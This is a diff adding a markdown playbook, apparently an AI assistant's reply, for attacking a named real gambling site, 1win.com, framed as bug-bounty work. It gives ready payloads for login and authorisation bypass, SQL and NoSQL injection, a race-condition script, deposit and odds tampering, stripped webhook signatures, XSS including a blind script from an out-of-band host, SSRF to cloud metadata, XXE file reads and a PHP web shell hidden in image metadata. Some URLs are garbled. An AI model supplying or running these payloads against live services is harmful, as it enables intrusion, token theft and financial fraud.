@@ -1,0 +1,209 @@
+To ensure flawless implementation from start to finish, here is your end-to-end, consolidated execution playbook. It integrates the Targets, Rate Limits, Tool Configurations, Exact Payloads, Testing Structures, and Response Verification Criteria into an absolute step-by-step workflow for all four focus areas.
+------------------------------
+## 🛠️ Phase 0: Mandatory Global Initialization (Pre-Hunting Setup)
+Before you touch any target endpoint, you must calibrate your environment to comply strictly with the program's policy.
+## 1. Global Burp Suite Throttling Configuration
+To strictly observe the maximum limit of 5 requests per second and 5 concurrent requests combined:
+
+   1. Click the top Settings gear icon in Burp Suite.
+   2. Select Tools -> HTTP.
+   3. Under Handling, check Set maximum concurrent requests → Set to 5.
+   4. Check Delay between requests (ms) → Set to 200.
+
+## 2. Dual Identity Isolation Setup
+
+* Browser Session 1 (Normal Window): Authenticate to Account A. (Your primary attacker user).
+* Browser Session 2 (Incognito Window): Authenticate to Account B. (Your target victim user).
+
+## 3. Out-Of-Band (OOB) Setup for SSRF, Blind XSS, & XXE
+
+   1. Open your terminal and start your preferred client:
+   
+   go install -v ://github.com
+   interactsh-client
+   
+   2. Copy your unique target domain from the terminal log output (e.g., xyz.oast.pro). Keep this running to listen for server-to-server callbacks.
+
+------------------------------
+## 1️⃣ Area 1: Authentication & Account Management
+
+* Target Scope: Registration, Login, Settings, Vouchers, Personal Account Dashboard.
+
+## Step 1: Mapping, Parameter Discovery, & Auth Bypass (Login/Registration)
+
+   1. Action: Open Burp Suite Proxy. Complete a baseline, successful login with Account A.
+   2. Action: Intercept a failed login attempt with bad credentials. Right-click the request panel and select Do Intercept -> Response to this request. Click Forward.
+   3. Payload Injection: When the server's error response freezes in your Proxy window, wipe out the server's genuine error payload and rewrite the status values manually.
+   * Target Payload: Replace the body string entirely with:
+      
+      {"success":true,"role":"admin","authenticated":true,"error":null,"status_code":200,"auth_state":"SUCCESS"}
+      
+      4. Response Verification Criteria: Click Forward. A critical flaw is confirmed if your web interface accepts the rewritten response and displays the private dashboard, bypassing credential validation.
+
+## Step 2: Input Manipulation & Injection (SQLi / NoSQLi Verification)
+
+   1. Action: Send the raw baseline Account A login request from your HTTP History over to Burp Repeater.
+   2. Payload Injection: Inject targeted logical escape characters into the input parameters (username/email/password).
+   * SQLi Payloads: Try standard bypass breakers:
+      
+      ' OR '1'='1
+      
+      admin' -- -
+      
+      * NoSQLi JSON Matrix: If the endpoint consumes JSON content, drop strings and rewrite inputs into raw boolean logic arrays:
+      
+      {"username": {"$gt": ""}, "password": {"$gt": ""}}
+      
+      {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+      
+      3. Response Verification Criteria: Hit Send. A vulnerability is confirmed if the web server switches from an HTTP 401 Unauthorized or error message screen into an HTTP 200 OK dashboard payload, or redirects you into a user profile without password verification.
+
+## Step 3: Authorization Isolation Breakdown (BOLA / IDOR Testing)
+
+   1. Action: Go to your BApp Store inside Burp and install Autorize. Open the Autorize panel tab.
+   2. Action: Copy the raw Cookie: or Authorization: Bearer <Token> header from Account B (Incognito window). Paste it directly into Autorize's Headers Configuration box. Toggle Autorize is off to Autorize is on.
+   3. Action: Return to your normal browser window (Account A). Navigate to your profile settings, click update, and modify your phone number or account configuration details.
+   4. Response Verification Criteria: Review the Autorize table logs. If Autorize marks the modified endpoint rows as Bypassed (colored yellow/green), cross-verify Account B. A BOLA flaw is confirmed if Account B's information was altered by Account A's activities.
+
+## Step 4: Vulnerability Stress Test (Voucher Code Race Condition)
+
+   1. Action: Install Turbo Intruder from the BApp Store. Right-click your baseline voucher submission request in your HTTP History and choose Extensions -> Turbo Intruder -> Send to Turbo Intruder.
+   2. Configuration Script: Drop this exact program-compliant execution block into the lower editor segment:
+   
+   def queueRequests(target, wordlist):
+       engine = RequestEngine(endpoint=target.endpoint,
+                              concurrentConnections=5, # Policy Limit Max
+                              requestsPerConnection=1,
+                              pipeline=False)
+       gate = engine.gate()
+       for i in range(5): # Queue 5 concurrent attempts max
+           engine.queue(target.req, gate=gate)
+       engine.openGate(gate)
+   def handleResponse(req, interesting):
+       table.add(req)
+   
+   3. Response Verification Criteria: Click Attack. A race condition vulnerability is present if multiple HTTP 200 OK success logs display in the results grid and the code adds balance increments multiple times to your test wallet.
+
+------------------------------
+## 2️⃣ Area 2: Financial Operations (Deposits, Withdrawals, & Payments)
+
+* Target Scope: Payment forms, callback handlers, webhooks, and deposit/withdrawal processing endpoints hosted on 1win.com.
+
+## Step 1: Deposit Interception & Value Tampering
+
+   1. Action: Initiate a real checkout routine via your dashboard deposit system. Set the initial balance value block to $10.00.
+   2. Action: Turn Intercept is On inside your Burp Suite Proxy. Click the confirm/checkout redirect button on the site.
+   3. Payload Injection: Analyze the captured raw parameter payload strings. Locate variables representing money boundaries and substitute them for testing decimals or anomalies.
+   * Tampered Variations: Locate strings like amount=10.00, subtotal=10.00, or fee=0.00 and substitute:
+      
+      amount=0.01
+      
+      amount=-100.00
+      
+      amount=1e-5
+      
+      4. Response Verification Criteria: Click Forward. complete the mutated transaction on the external processor for the low fee ($0.01). A parameter flaw is confirmed if the payment gateway processes the low transaction fee successfully and 1win.com credits your test balance with the full value ($10.00).
+
+## Step 2: Webhook Endpoint Signature Impersonation
+
+   1. Action: Look back through your Burp Suite HTTP History logs. Locate external payment notifications or transaction records sent to endpoints containing strings like /callback, /webhook, or /pay-notify.
+   2. Payload Injection: Send the webhook record to Burp Repeater. Modify transaction parameter statuses inside the request body string to read success parameters. Strip security protections within header properties.
+   * Signature Strip Payloads: Locate signature validation values (e.g., X-Payment-Signature, X-Provider-Hash) and modify:
+      
+      X-Payment-Signature: null
+      
+      X-Payment-Signature: 00000000000000000000000000000000
+      
+      3. Response Verification Criteria: Hit Send. An authentication bypass is confirmed if the server responds with a clear HTTP 200 OK or {"status":"success"} string instead of rejecting the signature, and automatically adds credits to your target wallet dashboard.
+
+------------------------------
+## 3️⃣ Area 3: Casino & Betting Core Features
+
+* Target Scope: Live sportsbook betting forms, bet slips, casino slots, card engines, and active public room channels on 1win.com.
+
+## Step 1: Real-Time Stream Capture (WebSocket Baseline)
+
+   1. Action: Open Burp Suite. Navigate to Proxy -> WebSockets history.
+   2. Action: Open a live casino game slot or interactive sports wager page in your browser. Place a minimum baseline validation bet.
+   3. Action: Review the WebSockets history logs. Identify outgoing binary or text JSON data blocks that communicate betting states to the host platform.
+
+## Step 2: Live In-Flight State & Odds Manipulation
+
+   1. Action: Go to Proxy -> Proxy settings -> Tools -> Proxy and scroll down to Match and Replace.
+   2. Configuration Rules: Click Add to configure an automated real-time rewrite string rule:
+   * Match Rule Options:
+      * Type: Request body
+         * Match: "odds":1.5 (or matching your baseline data odds value)
+         * Replace: "odds":999.0
+      3. Action: Place an active wager in the browser window with the replacement configuration rule turned on.
+   4. Response Verification Criteria: A validation vulnerability is present if the outbound transaction processes successfully and the final bet ticket shows your manipulated high odds or payout values.
+
+## Step 3: Injection Escaping Audits (Stored & Blind XSS)
+
+   1. Action: Identify all free-form text boxes across betting rooms, custom bet names, profile nickname fields, or support help channels.
+   2. Payload Injection: Input structured script breaking blocks to check context escaping properties.
+   * Breakout Payloads: Use strings tailored to test attribute elements and execution scopes:
+      
+      " onfocus="alert(document.domain)" autofocus="
+      
+      <img src=x onerror=alert(document.domain)>
+      
+      * Blind OOB XSS Payload (Using your unique domain block from Phase 0):
+      
+      "><script src="http://oast.pro"></script>
+      
+      3. Response Verification Criteria: Review your running OOB listener terminal closely over time. A security vulnerability is present if your console log tracks a connection from a corporate domain containing information like admin page locations, cookies, or authorization tokens.
+
+------------------------------
+## 4️⃣ Area 4: Infrastructure & Input Handling (Platform-Wide)
+
+* Target Scope: KYC asset document upload screens, link/avatar fetching systems, profile picture URLs.
+
+## Step 1: Out-of-Bound Resource Fetching (SSRF Check)
+
+   1. Action: Identify application profile areas that allow loading files, pulling web avatars, or providing custom webhook URLs.
+   2. Payload Injection: Drop internal loopback network targets or cloud configuration directories directly into the loading box parameters.
+   * SSRF Loopback Formats:
+      
+      http://127.0.0.1:8080
+      
+      http://localhost:3000
+      
+      * Cloud Infrastructure Target (Using your unique domain block from Phase 0 for OOB verification):
+      
+      http://169.254.169
+      
+      3. Response Verification Criteria: If the server response returns internal infrastructure details, or if your OOB terminal prints a DNS/HTTP request originating from the platform's IP address, an SSRF flaw is confirmed. Stop testing immediately.
+
+## Step 2: Document Structure Injections (XXE & Local File Reads)
+
+   1. Action: Locate the target platform identity upload panel (KYC document intake).
+   2. Payload Injection: Open a local text file editor, save this exact structured document XML code below as exploit.svg, and attempt to upload it as your profile picture or identity confirmation file:
+   
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE test [  
+     <!ENTITY xxe SYSTEM "file:///etc/hostname"> 
+   ]>
+   <svg width="100" height="100" xmlns="http://w3.org">
+     <text x="10" y="20" font-size="12">&xxe;</text>
+   </svg>
+   
+   3. Response Verification Criteria: A vulnerability is present if the application prints an error message containing the server's internal host identification string, or returns the rendered graphic showing the system hostname.
+
+## Step 3: Remote Code Execution Execution Loops (RCE Checks)
+
+   1. Action: Locate file document intake systems that do not perform strict signature checking routines.
+   2. Payload Injection: Open your local workstation terminal console. Use exiftool to safely hide code signatures within a completely valid picture file asset before sending it to the site:
+   
+   exiftool -Comment="<?php system($_GET['cmd']); ?>" valid_avatar.png
+   
+   3. Action: Upload valid_avatar.png via your test dashboard. Intercept the payload stream in Burp and rewrite the file descriptor from .png to .php or .phtml.
+   4. Response Verification Criteria: Locate the public path where your file is stored on the server. Append the argument parameter ?cmd=id to the asset URL. An RCE flaw is confirmed if the page returns text matching server user identities (e.g., uid=33(www-data)). Stop all testing actions immediately.
+
+------------------------------
+If you are ready to assemble your testing logs or draft a findings report, let me know:
+
+* Which specific vulnerability discovery or payload interaction you need to document.
+* If you need a template to layout your Reproduction Steps and Proof of Concept payload records.
+
+
